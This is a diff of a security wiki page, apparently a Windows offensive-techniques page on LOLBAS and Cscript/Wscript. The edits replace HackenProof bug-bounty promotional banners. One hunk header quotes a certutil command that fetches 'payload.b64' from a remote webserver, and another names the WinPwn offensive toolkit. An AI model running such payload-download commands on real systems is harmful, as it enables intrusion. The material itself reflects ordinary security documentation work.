@@ -2,16 +2,15 @@
 
 
 
-​
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FfinO3sjcfKcruYYBafKC%2Fimage.png?alt=media&#x26;token=7bba2ebb-a679-4357-a859-bff2d9c5136a" alt=""><figcaption></figcaption></figure>
+[**Follow HackenProof**](https://bit.ly/3xrrDrL) **to learn more about web3 bugs**
 
-​​Did you know that crypto projects pay more bounty rewards than their web2 counterparts?\
-This [**crypto bounty alone**](https://hackenproof.com/jungle/jungle-smart-contract) is worth $1.000.000!\
-Check out the [**top-paying bounties**](https://hackenproof.com/programs) among crypto projects.\
-[**Sign up on HackenProof**](https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA) to get rewarded without delays and become the web3 hacker legend.
+🐞 Read web3 bug tutorials
 
-{% embed url="https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA" %}
+🔔 Get notified about new bug bounties
+
+💬 Participate in community discussions
 
 ## Lolbas
 
@@ -297,16 +296,17 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 
 **Detected by defender**
 
+****
 
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FfinO3sjcfKcruYYBafKC%2Fimage.png?alt=media&#x26;token=7bba2ebb-a679-4357-a859-bff2d9c5136a" alt=""><figcaption></figcaption></figure>
+[**Follow HackenProof**](https://bit.ly/3xrrDrL) **to learn more about web3 bugs**
 
-​​​​Did you know that crypto projects pay more bounty rewards than their web2 counterparts?\
-****This [**crypto bounty alone**](https://hackenproof.com/jungle/jungle-smart-contract) is worth $1.000.000!\
-Check out the [**top-paying bounties**](https://hackenproof.com/programs) among crypto projects.\
-[**Sign up on HackenProof**](https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA) to get rewarded without delays and become the web3 hacker legend.
+🐞 Read web3 bug tutorials
 
-{% embed url="https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA" %}
+🔔 Get notified about new bug bounties
+
+💬 Participate in community discussions
 
 ## **Cscript/Wscript**
 
@@ -552,13 +552,14 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS console with some offensive
 
 ​
 
-<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FfinO3sjcfKcruYYBafKC%2Fimage.png?alt=media&#x26;token=7bba2ebb-a679-4357-a859-bff2d9c5136a" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
-​​​​​Did you know that crypto projects pay more bounty rewards than their web2 counterparts?\
-This [**crypto bounty alone**](https://hackenproof.com/jungle/jungle-smart-contract) is worth $1.000.000!\
-Check out the [**top-paying bounties**](https://hackenproof.com/programs) among crypto projects.\
-[**Sign up on HackenProof**](https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA) to get rewarded without delays and become the web3 hacker legend.
+[**Follow HackenProof**](https://bit.ly/3xrrDrL) **to learn more about web3 bugs**
 
-{% embed url="https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA" %}
+🐞 Read web3 bug tutorials
+
+🔔 Get notified about new bug bounties
+
+💬 Participate in community discussions
 
 
